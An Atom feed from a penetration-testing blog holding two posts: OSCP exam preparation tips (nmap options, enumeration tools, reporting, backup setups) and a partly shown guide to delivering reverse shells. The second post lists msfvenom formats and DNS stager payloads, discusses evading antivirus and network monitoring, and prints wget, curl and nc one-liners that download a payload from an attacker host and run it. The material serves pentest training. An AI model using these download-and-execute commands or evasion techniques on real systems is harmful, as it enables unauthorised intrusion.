<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-03-29T12:48:28-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Devil Security Blog</title><subtitle>Welcome to the darker side of security</subtitle><author><name>True Demon</name></author><entry><title type="html">OSCP Journey Pt.3 - Preparation Tips and Avoiding Mistakes</title><link href="http://localhost:4000/2019/03/28/oscp-journey-3/" rel="alternate" type="text/html" title="OSCP Journey Pt.3 - Preparation Tips and Avoiding Mistakes" /><published>2019-03-28T12:24:00-04:00</published><updated>2019-03-28T12:24:00-04:00</updated><id>http://localhost:4000/2019/03/28/oscp-journey-3</id><content type="html" xml:base="http://localhost:4000/2019/03/28/oscp-journey-3/">&lt;figure class=&quot;&quot;&gt;
  &lt;img src=&quot;/images/posts/panic-button.jpg&quot; alt=&quot;&quot; /&gt;
  
&lt;/figure&gt;

&lt;p&gt;If I were to summarize what leads to success on the OSCP in a single word, it would be &lt;strong&gt;persistence&lt;/strong&gt;. With each attempt I made at the exam, things got a little easier. For whatever reason, my way of passing the OSCP came through brute-force, repeated iteration, a &lt;em&gt;lot&lt;/em&gt; of screaming into the pillow, and absolute brick-like stubbornness. I understand that most people shouldn’t &lt;em&gt;need&lt;/em&gt; as many attempts as I have but… here I am – still trying.&lt;/p&gt;

&lt;p&gt;Maybe my OSCP journey is less about being a bad-ass hackerman and more about learning how not to give up so that I can pass on the knowledge. Whatever the case may be, this next post is to cover some of the essential information I think everyone should have when they prepare to take the OSCP.&lt;/p&gt;

&lt;h2 id=&quot;collecting-tools--trade-secrets&quot;&gt;Collecting Tools &amp;amp; Trade Secrets&lt;/h2&gt;

&lt;p&gt;The OSCP is less about being a genius hacker than it is about being a stickler for methodical enumeration. You might get the impression that the OSCP requires you to be insanely knowledgeable about all things computing. Spoiler alert – it doesn’t. What the OSCP really wants from you is to understand how to be thorough. Real penetration testers spend more time reconnoitering an environment than actually attacking it, unless you get lucky with an obvious RCE or you cheat and use a vulnerability scanner to give you the answers, but that’s no fun, hence why it is banned for the exam. Getting a feel for what tools you should start with, and how you should approach a given network or system is an important step in the learning process that I had ignored in my previous attempt.&lt;/p&gt;

&lt;p&gt;How I rectified this was by completely re-reading and keeping an open copy of the PWK Guide open on my computer at all times so that I could reference it as I stepped through the labs. I stopped trying to hit everything at once and instead begin developing a set of tools and sequential steps for enumerating services as I went along. Time and time again, I found that &lt;strong&gt;nmap&lt;/strong&gt; of all things was what I needed 90% of the time because of the nifty little NSE scripts it has. This wasn’t the only tool I could make use of, naturally, but if someone had a tool to enumerate a specific service, someone probably already made a handy little lua script for the Nmap Scanning Engine already. Sure enough, I found that developing my own scripts for scanning services was less necessary than just getting REALLY good at remembering to check the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/nmap/scripts/&lt;/code&gt; directory for something related to what I was scanning.&lt;/p&gt;

&lt;p&gt;The second thing I learned to do was to &lt;strong&gt;bookmark absolutely everything&lt;/strong&gt;. Having a dedicated folder in your bookmarks tab for tutorials and guides might seem like an obvious thing to do from the beginning, but I’m probably one of the dumber students the PWK course has ever seen, so I didn’t think of it before hand, and instead relied on my fire-from-the-hip Google-fu to get me through. I found that the OSCP forums were great for getting hints and tips on how to exploit specific boxes, but not so much at finding good research material. Instead, I started looking for &lt;em&gt;other&lt;/em&gt; “how not to bomb the OSCP” guides and started collecting their reference material. In particular, I got an enormous amount of information from a few golden sources.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3&quot;&gt;How-to-OSCP&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/burntmybagel/OSCP-Prep/blob/master/README.md&quot;&gt;OSCP-Prep Resources&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teckk2.github.io/category/OSCP.html&quot;&gt;Teck_k2 OSCP Guide&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://411hall.github.io/OSCP-Preparation/&quot;&gt;James Hall’s OSCP Preparation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It’s through these few resources that the flood-gates opened to link after link of new tools, resources, handy tips, and things I needed to know to even stand a chance. I particularly got a great deal of information from James (411) Hall when he pointed out useful enumeration scripts and automating a lot of the manual digging around for privilege escalation information, but we’ll get to that later.&lt;/p&gt;

&lt;p&gt;Besides gathering tons of links on “how to OSCP better”, I started looking a lot more closely at the scripts and tools in the Kali applications menu. It’s funny how much you can learn by simply reading the MAN pages for a change.&lt;/p&gt;

&lt;h2 id=&quot;expect-the-unexpected&quot;&gt;Expect the unexpected&lt;/h2&gt;

&lt;p&gt;A lot of very interesting things can be encountered in the OSCP labs that you just don’t count on or have never seen before. Really what this is doing is getting you in the habit of exploring things outside of your comfort zone. I failed to do this in my first attempt at the exam, but this changed immediately after reassessing my approach. Rather than looking over the whole network for the low-hanging fruit, I would essentially roll the dice and pick a system at random to start looking into. When you look at the OSCP labs like a network administrator, you can easily see that there is absolutely no congruence, no obvious relationship between any of the systems in the network other than the fact that they all have something wrong with them.&lt;/p&gt;

&lt;p&gt;There are a small, select few systems that share some relationship that causes one to lead to exploiting the other, but the majority are their own puzzle to solve. It leads to a lot of frustration and hair-pulling, but finally ends with ultimate gratification once you figure out the answer. Often times, you’ll find that the answer was very simple, and that eureka moment was something like a carrot on a stick for me. It motivated me just enough to endure going after the hardest boxes for the sake of learning something new.&lt;/p&gt;

&lt;p&gt;When you look at the labs this way, especially if you have done penetration testing for enterprise organizations, you can allow yourself to throw out the book on what you know works, because it won’t work in the OSCP labs. Things like Mimikatz, dumping hashes, sniffing credentials off the network, those things aren’t &lt;em&gt;usually&lt;/em&gt; going to be useful to you. It’s too easy, and you wouldn’t learn anything new if that’s all it took. Again, there are exceptions, but try to exhaust all other possibilities before looking for that “link” between boxes.&lt;/p&gt;

&lt;p&gt;I also made it a habit to organize each box and document or pipe the output of every single thing I did to any given system. Re-running scans is an exceedingly annoying and obnoxious procedure that you can avoid simply by adding the &lt;code class=&quot;highlighter-rouge&quot;&gt;-oA&lt;/code&gt; flag to your Nmap scans. They can be exceptionally useful to you in ways you didn’t expect.&lt;/p&gt;

&lt;p&gt;For instance, did you know that &lt;strong&gt;searchsploit accepts nmap.xml files as input for searching exploits&lt;/strong&gt;? I didn’t – until now that is, and like everything else I learned in the OSCP, it shocked me with how easy it was. Chances are, if you’ve encountered something you’ve never seen before, someone else has, and they probably have a tool for that.&lt;/p&gt;

&lt;h2 id=&quot;arming-up&quot;&gt;Arming up&lt;/h2&gt;

&lt;p&gt;I’ve hinted at a lot of tools that made my life infinitely easier during the labs. There are probably too many to actually list out or this post would turn into an encyclopedia, but I’ll highlight some of the real life-savers.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Nmap&lt;/strong&gt; obviously goes up to the Number 1 spot here, but specifically, I wanted to highlight some of the syntax voodoo that I found made life easier for me.
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Always use the &lt;code class=&quot;highlighter-rouge&quot;&gt;-n&lt;/code&gt; option to prevent DNS resolution&lt;/strong&gt;, which wastes unnecessary time, especially during the exam. The hosts will never resolve anyway, which causes the scan to delay about 30 seconds per host.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Always use the &lt;code class=&quot;highlighter-rouge&quot;&gt;-oA &amp;lt;filename&amp;gt;&lt;/code&gt; options to keep a set of files&lt;/strong&gt;. The .xml file can be imported to other tools like the MSFconsole database so you can review them quickly, and searchploit using the &lt;code class=&quot;highlighter-rouge&quot;&gt;--nmap&lt;/code&gt; option to identify possible exploits based on scan data.&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Always use the &lt;code class=&quot;highlighter-rouge&quot;&gt;timeout&lt;/code&gt; options on large scans&lt;/strong&gt;. I don’t know if I’m the only one who experienced these issues, but nmap scanning became a grueling slog when trying to scan large spans of ports. Preventing Nmap from exponentially increasing scan time by manually setting probe timouts, maximum retries, and minimum scanning rate via &lt;code class=&quot;highlighter-rouge&quot;&gt;--max-rtt-timeout&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;--max-retries&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;--min-rate&lt;/code&gt; is important for guaranteeing your port-scans actually finish in a reasonable amount of time.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-sS&lt;/code&gt; before you &lt;code class=&quot;highlighter-rouge&quot;&gt;-sV&lt;/code&gt;. Syn scanning requires drastically less time than version/fingerprint scanning. For some reason, Nmap decides that it will repeat the &lt;code class=&quot;highlighter-rouge&quot;&gt;-sV&lt;/code&gt; on all possible ports, even ones that the &lt;code class=&quot;highlighter-rouge&quot;&gt;-sS&lt;/code&gt; scan has determined are closed. By performing the &lt;code class=&quot;highlighter-rouge&quot;&gt;-sS&lt;/code&gt; scan and using the -p option to target specific ports for your fingerprint scan, you save a &lt;em&gt;lot&lt;/em&gt; of time.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sS -p21 --script ftp-\*&lt;/code&gt; Using the &lt;code class=&quot;highlighter-rouge&quot;&gt;\*&lt;/code&gt; can parse through the /usr/share/nmap/scripts folder for any nse script that starts with “ftp-“, crawling through the ftp scripts, including one that searches for anonymous logins, something that was very common in the labs and somewhat time-consuming to check manually. You can apply this to virtually any other protocol like &lt;code class=&quot;highlighter-rouge&quot;&gt;smb-\*&lt;/code&gt;.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sS --script \*vuln\*&lt;/code&gt; Scan for known vulnerabilities. Almost all of the vuln-scanning scripts have the “vuln” keyword in the title, and can save some time. “cve” is also common as well. If you don’t want to waste time, be sure to isolate ports and protocols first.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Can’t find any interesting ports? Don’t forget &lt;code class=&quot;highlighter-rouge&quot;&gt;-sU&lt;/code&gt;. The UDP scan is often overlooked during the exam, but it’s a critical one. Especially if you find an SNMP service running. SNMP is a huge opportunity for host enumeration, and it’s an easy test to check for SNMP on port 161.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Be selective about your ports via &lt;code class=&quot;highlighter-rouge&quot;&gt;--top-ports&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;-p1-10000 -r&lt;/code&gt;. Sometimes the most popular ports are what you’re looking for, sometimes they aren’t. The OSCP labs are good about trolling their students, so you’ll be surprised to find random services running on weird port numbers. You can save yourself some frustration by being selective about your portscans and using the &lt;code class=&quot;highlighter-rouge&quot;&gt;-r&lt;/code&gt; option to force sequential port scans, rather than based on their likelihood ratio.  &lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Read the &lt;a href=&quot;https://nmap.org/book/&quot;&gt;NMAP docs&lt;/a&gt; for more awesome tips. It’s useful stuff.  &lt;br /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Enum4linux&lt;/strong&gt; is a fantastic tool for enumerating SMB and NetBIOS ports, which are notorious for being chock full of information disclosure bugs and misconfigurations, namely when null-sessions are allowed. When I see SMB and NetBIOS open, this is the first tool I run, and sometimes it’s all I need.  &lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;smtp-user-enum&lt;/strong&gt; and &lt;strong&gt;ssh-user-enum&lt;/strong&gt; are two exceptionally useful and fast-running tools that can quickly validate the existence of users on most linux hosts. Combined the metasploit unix-users wordlist, you can quickly confirm common users that might be useful for logging in. During the OSCP labs, I noted that sometimes the common user isn’t the end-goal though, so you will probably need to study the box a bit and find out the names of likely users. Here is a copy of the latest OpenSSH User enumeration flaw, if you don’t already have it. &lt;a href=&quot;https://www.exploit-db.com/exploits/45233&quot;&gt;OpenSSH 2.3 &amp;lt; 77 - User Enumeration&lt;/a&gt;  &lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Gobuster&lt;/strong&gt; has been my preferred alternative since DirBuster support was pulled. It’s built into the repositories for Kali, but must be installed via &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install gobuster&lt;/code&gt;. It’s easily my favorite directory brute-forcer for its speed and multi-thread capability, and an absolute must for the OSCP course.  &lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/AlessandroZ/BeRoot&quot;&gt;beroot&lt;/a&gt;&lt;/strong&gt; is extremely handy for enumerating common privilege escalations in windows. It’s a bit dated, but still an excellent go-to for quickly eliminating the most common exploits as a possible path to NT System.  &lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/411Hall/JAWS&quot;&gt;JAWS&lt;/a&gt;&lt;/strong&gt; is also a solid powershell alternative for privilege escalation enumeration from James @411Hall Hall that was equally powerful as BeRoot.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;prepare-for-shell-hell&quot;&gt;Prepare for Shell Hell&lt;/h2&gt;

&lt;p&gt;Your shells will get dropped &lt;em&gt;constantly&lt;/em&gt; during the labs, and you’re expected to know how to react to that quickly. Figuring out ways to quickly obtain a shell &lt;em&gt;and&lt;/em&gt; make sure it is stable will be a brutal frustration during your time in the labs, and especially while you are racing the clock during your exam. For that reason, I &lt;strong&gt;strongly&lt;/strong&gt; recommend becoming an absolute wizard at figuring out multiple ways to deliver, execute, and stabilize your shells.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; will be your BFF for the duration of the labs, but I strongly recommend you do not get too comfortable with meterpreter. You will not have the luxury of using meterpreter more than once, and in my experience, most of the modules have not been helpful. You’re better off learning the hard way during the labs and avoid the heart-ache and absolute panic you’ll experience when you realize you have no idea how to manage a raw TCP shell.&lt;/p&gt;

&lt;p&gt;Focus instead on working on being able to get raw shells via &lt;strong&gt;netcat&lt;/strong&gt;, &lt;strong&gt;socat&lt;/strong&gt;, &lt;strong&gt;powershell&lt;/strong&gt;, &lt;strong&gt;python&lt;/strong&gt;, &lt;strong&gt;perl&lt;/strong&gt; and other native execution methods. &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;Arr0way’s Reverse Shell Cheat Sheet&lt;/a&gt; is an excellent tab to keep open during the labs in case you run into something you have not encountered before and are desperate for more shells.&lt;/p&gt;

&lt;p&gt;The main thing is to train yourself to be able to operate independently of Metasploit and the meterpreter shell. It is powerful but highly detectable, and altogether unavailable to you during the OSCP exam except for one system. My strategy was to find and execute local exploits the first time with meterpreter, then go back and repeat the process using a raw TCP shell and native tools, including the enumeration process. Once you’ve done this the first few times, try exploiting a system entirely with the raw shell and don’t rely on metasploit at all. This will help prepare you for the kinds of activities you’ll need to perform.&lt;/p&gt;

&lt;p&gt;Knowing how to port-forward with plink and ssh, having multiple methods for downloading and uploading files to your target, and a cheat-sheet of enumeration and common commands will keep you on-track and avoid wasting precious time researching how to perform common enumeration tasks.&lt;/p&gt;

&lt;h2 id=&quot;plan-your-attacks-with-a-to-do-list&quot;&gt;Plan your attacks with a To-Do list&lt;/h2&gt;

&lt;p&gt;One frequent problem test-takers encounter during the OSCP is that they don’t plan ahead and will clumsily hammer away at hosts using different tools almost at random. You may get lucky sometimes, and you might not. During the OSCP labs, you can’t afford to miss anything, and you never know where you will encounter clues or hidden services to allow you to exploit a system.&lt;/p&gt;

&lt;p&gt;What helped me a lot was to create a script for me to follow when enumerating a new box. Not an automated script, mind you, but a list of tools and common things to check for whenever I set about attacking a fresh box. This will help you with your note-taking process and ensures you don’t forget to run all the tools necessary to fully enumerate a system.&lt;/p&gt;

&lt;h2 id=&quot;be-persistent-take-your-breaks-and-know-when-to-start-over&quot;&gt;Be persistent, take your breaks, and know when to start over&lt;/h2&gt;

&lt;p&gt;Tunnel vision is a big killer on the OSCP exam, and a frustrating learning experience during the PWK course. Getting too focused on one thing for too long can eventually lead to endless rabbit holes and wastes previous time. Finding the balance between persistent determination and knowing when to pull back and try something else is perhaps the hardest lesson to grasp.&lt;/p&gt;

&lt;p&gt;I’ve learned through the PWK course that not everything will be straight-forward, whether it’s the labs or the real thing. Automation will only take you so far, so developing your intuition for finding chinks in the armor of any system is perhaps the best learning experience you’ll get from the labs.&lt;/p&gt;

&lt;p&gt;My rule of thumb is, when you find yourself repeating the same steps and running the same tools on a specific port, website, or whatever, that’s when you need to stand up, walk away, and take a break. When you eventually return with a fresh perspective is when you think to yourself, “Maybe there’s something I missed…”&lt;/p&gt;

&lt;p&gt;Run a different port scan, run it a different way, start over with your enumeration completely, start looking elsewhere. I’ve found that when you feel absolutely stuck because “there is nothing there”, that is the time when you need to step back and start over fresh.&lt;/p&gt;

&lt;h2 id=&quot;screenshot-and-document-as-you-go&quot;&gt;Screenshot and document as you go&lt;/h2&gt;

&lt;p&gt;Reporting is absolutely &lt;em&gt;everything&lt;/em&gt; when it comes to the OSCP exam. It makes sense, seeing as it’s ultimately what your client pays for when you perform a penetration test. Obviously it doesn’t matter if you can own a network six ways to Sunday if you can’t communicate that to the client in a meaningful way, and that is the kind of emphasis on reporting that makes the OSCP so unique.&lt;/p&gt;

&lt;p&gt;That being said, it’s important that you don’t forget to document every detail, about every box. It’s best to do these things as you go along your way during the exam. Each time you find a new clue, service, flaw, exploit, and flag, take a screenshot and drop it into a folder, preferably one backed up to the cloud. Given the number of reboots and technical issues I had, I can tell you that it would have been made far worse had I not been maintaining all of my notes and screenshots in a cloud-backup folder that synced automatically.&lt;/p&gt;

&lt;p&gt;Another important note on reporting, when you first get your VPN access, the first thing you should do is go to the OSCP Exam Panel, the page where you submit your flags, and save a copy of the system descriptions and reporting instructions. It will tell you how many screenshots and the level of detail expected of you in your report for each individual system.&lt;/p&gt;

&lt;p&gt;Obviously document your flags, and submit them immediately. You won’t get &lt;em&gt;any&lt;/em&gt; points if you don’t submit your flags in the Exam Panel, even if they show up in your report later. I’d also recommend reviewing the &lt;a href=&quot;https://support.offensive-security.com/oscp-exam-guide/&quot;&gt;OSCP Reporting Guidelines&lt;/a&gt; before your exam so you have a fresh idea of what to expect.&lt;/p&gt;

&lt;h2 id=&quot;have-a-backup-system&quot;&gt;Have a backup system&lt;/h2&gt;

&lt;p&gt;Arguably the most important advice I can give is to have something to fall back on if your system fails for any reason. My primary setup was a laptop with Fedora 29 installed and using VMware Workstation.&lt;/p&gt;

&lt;p&gt;I ran into a bunch of troubles that could have been bypassed during several exam attempts if I had just switched to a different system.&lt;/p&gt;

&lt;p&gt;My advice is to simply make sure you’ve got a backup plan for if your power or internet goes out, and if you lose for machine or current VM. I later prepared by cloning my PWK image to a second computer, but you could also have a NAS or even a really fast USB 3.0+ flash drive or external hard drive. As long as you have at least two options, you can give yourself a little extra insurance.&lt;/p&gt;</content><author><name>True Demon</name></author><summary type="html"></summary></entry><entry><title type="html">Pop all the shells: A guide for hackers living off the land</title><link href="http://localhost:4000/2019/03/23/pop-all-the-shells/" rel="alternate" type="text/html" title="Pop all the shells: A guide for hackers living off the land" /><published>2019-03-23T14:16:00-04:00</published><updated>2019-03-23T14:16:00-04:00</updated><id>http://localhost:4000/2019/03/23/pop-all-the-shells</id><content type="html" xml:base="http://localhost:4000/2019/03/23/pop-all-the-shells/">&lt;figure class=&quot;&quot;&gt;
  &lt;img src=&quot;/images/posts/heart-shells.png&quot; alt=&quot;&quot; /&gt;
  
&lt;/figure&gt;

&lt;p&gt;During my OSCP Journey series, I mentioned a few pitfalls I experienced, primarily surrounding how to deliver, execute, and maintain stable shells throughout the test. I have also taken note that actually getting shells to execute during real-world pentests has grown a lot more difficult as AV solutions and heuristic detection of malware has slowly begun to grow more effective. Such is the way with this cat and mouse game we play with blue-teamers and Antivirus vendors.&lt;/p&gt;

&lt;p&gt;However, there still remain some tried and true methods to obtaining shells on modern operating systems that are always going to be hard to stop completely. The trick to getting stable shells is by keeping things simple and using the native, built-in tools that the OS provides us with. You see, AV has to walk a very thin tight-rope between failing to detect malware and blocking legitimate activity. In a lot of ways, their job is several orders of magnitude more difficult than attackers because we only need to find one gap. They have to find both the gap and make sure they can positively identify a malicious action without completely blacklisting it wholesale in a way that blocks legitimate activity and frustrates the user.&lt;/p&gt;

&lt;p&gt;Without further ado, here is a list of my choice methods for &lt;strong&gt;delivering&lt;/strong&gt;, &lt;strong&gt;executing&lt;/strong&gt;, and &lt;strong&gt;stabilizing&lt;/strong&gt; shells and backdoors.&lt;/p&gt;

&lt;h2 id=&quot;payload-preparation&quot;&gt;Payload Preparation&lt;/h2&gt;

&lt;p&gt;Knowing your target environment is the first step. As always, having good information on your target comes before the exciting part of actually breaking into something. Thankfully, the fine folks at Rapid7 and the predecessor developers that gave us the Metasploit Framework provided us with metasploit’s sidekick, msfvenom.&lt;/p&gt;

&lt;h3 id=&quot;shell-formats&quot;&gt;Shell Formats&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom --help-formats&lt;/code&gt; will quickly drop a list of the different valid types of shells you should be familiar with. The &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/&quot;&gt;Metasploit Unleashed&lt;/a&gt; tutorial from OffSec is a good reference, but I’ll quickly break down the types of shell formats that are the most reliable and useful during your labs.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;raw&lt;/code&gt; - Use this for getting the raw shell source-code based on the payload you choose. ie: &lt;code class=&quot;highlighter-rouge&quot;&gt;php/reverse_php&lt;/code&gt; will give you raw php source code. &lt;code class=&quot;highlighter-rouge&quot;&gt;perl/reverse_tcp&lt;/code&gt; will give you a raw perl reverse shell script, and so on. Useful for arbitrary PHP upload vulnerabilities, and also for executing a shell via a local script interpreter.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; - My personal favorite for Windows execution is reflective DLL injection. Windows DLLs are flexible and can be easily injected directly into memory for reliable shell execution, and it automatically is executed in the background as a separate process, which all but guarantees a stable shell.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;elf/exe&lt;/code&gt; - Executable binaries for Linux/Windows respectively are very useful and are reliable even in the absence of scripting languages or special privileges. Ordinarily this would run the risk of setting off AV, but we’re not worried about that here.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;java/perl/python/ruby/etc&lt;/code&gt; - Normally reserved for exploit development, these language-specific payloads are also applicable, particularly in certain web applications where native code execution can occur. Every now and again, you may find some magical interpreter built into the application. These methods give you the raw bytecode, so to execute it will require the native execution method for that specific language to call the bytecode directly.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psh-cmd&lt;/code&gt; - Create a powershell one-liner with this handy format.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;war&lt;/code&gt; - The unassuming “war” file is a java-based executable that commonly accompanies web applications and automation services like those you find on Jenkins and JBoss instances.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;shell-transports&quot;&gt;Shell Transports&lt;/h3&gt;

&lt;p&gt;Transport methods are how the session will be set up once the shell executes. The most common one is raw TCP, which can often be the most reliable, but is also the lease resilient against AV and especially network monitors and intrusion prevention systems. For those reasons, you’ll usually need to make use of encapsulation – encryption.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HTTPS&lt;/strong&gt; is the most popular for several reasons. HTTP is the most common and most essential type of web-based traffic. It’s unlikely to be blacklisted by firewalls, and even if it is filtered, there are usually ways around it. It’s also extensible, easy to proxy, and encryption is expected. The only problem you may run into is where next-gen firewalls support &lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Deep_packet_inspection&quot;&gt;deep packet inspection&lt;/a&gt; (DPI)&lt;/strong&gt; which effectively amounts to &lt;a href=&quot;https://blog.checkpoint.com/2016/03/07/targeted-ssl-stripping-attacks-are-real/&quot;&gt;SSL-Stripping&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt; transports are less common because they are slow but pretty sneaky when done right. DNS traffic being an essential protocol for normal network operations, DNS is almost never blocked beyond the boundaries of a network. This form of transport works by using this idea to transport communications via DNS request-reply communication over UDP to the attacker’s server, acting as an ordinary DNS server.&lt;/p&gt;

&lt;p&gt;The only reasonable defense for this is if unapproved DNS servers are blocked by network policies. As you can imagine, this is rarely found in production. The main disadvantage is how slow it is, and that it is an unencrypted protocol; however, with the advent of DNS over SSL, this may change in the future. &lt;strong&gt;&lt;a href=&quot;https://wiki.skullsecurity.org/Dnscat&quot;&gt;DNSCat&lt;/a&gt;&lt;/strong&gt; is currently the most popular standalone tool for this kind of delivery method, but even metasploit has a few of these available&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; search type:payload dns

Matching Modules
================

   Name                                                    Disclosure Date  Rank    Check  Description
   ----                                                    ---------------  ----    -----  -----------
   payload/windows/dllinject/reverse_tcp_dns                                normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)
   payload/windows/dllinject/reverse_tcp_rc4_dns                            normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/dns_txt_query_exec                                       normal  No     DNS TXT Record Payload Download and Execution
   payload/windows/meterpreter/reverse_tcp_dns                              normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   payload/windows/meterpreter/reverse_tcp_rc4_dns                          normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/patchupdllinject/reverse_tcp_dns                         normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)
   payload/windows/patchupdllinject/reverse_tcp_rc4_dns                     normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/patchupmeterpreter/reverse_tcp_dns                       normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
   payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns                   normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/shell/reverse_tcp_dns                                    normal  No     Windows Command Shell, Reverse TCP Stager (DNS)
   payload/windows/shell/reverse_tcp_rc4_dns                                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/upexec/reverse_tcp_dns                                   normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)
   payload/windows/upexec/reverse_tcp_rc4_dns                               normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   payload/windows/vncinject/reverse_tcp_dns                                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
   payload/windows/vncinject/reverse_tcp_rc4_dns                            normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;payload-delivery&quot;&gt;Payload Delivery&lt;/h2&gt;

&lt;p&gt;Depending on the host and the vulnerability you’re exploiting, figuring out how to get a shell to the target can be the trickest part, especially if you’re limited on payload length or execution methods. Here are the most reliable ways I’ve been able to quickly deliver my shellcode for a stable shell.&lt;/p&gt;

&lt;h3 id=&quot;web-delivery&quot;&gt;Web Delivery&lt;/h3&gt;

&lt;p&gt;Simple web delivery is the most straight-forward method, and you can open up your own HTTP server without having to configure Apache/Nginx, or anything like that. All you need is cd to the directory you want to share with your targets (I usually create a &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/payloads&lt;/code&gt; folder) and serve it with this simple python one-liner.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp/payloads
python2 -m SimpleHTTPServer &amp;lt;port&amp;gt;           // default port: 8888
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that you’ve got your web server running, you need to get your target to download it. With Linux, you have several options:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wget download &amp;amp; pipe to shell
wget -O - http://attacker-ip:8888/payload.sh | sh

# Netcat pipe to file &amp;amp; execute in background
nc attacker-ip:8888/payload.sh &amp;gt; /tmp/payload &amp;amp;&amp;amp; /tmp/payload &amp;amp;

# Curl silent download &amp;amp; execute
curl -sL http://attacker-ip:8888/payload.sh | sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Windows is a little less straight-forward, but there are still ample possibilities:&lt;/p&gt;

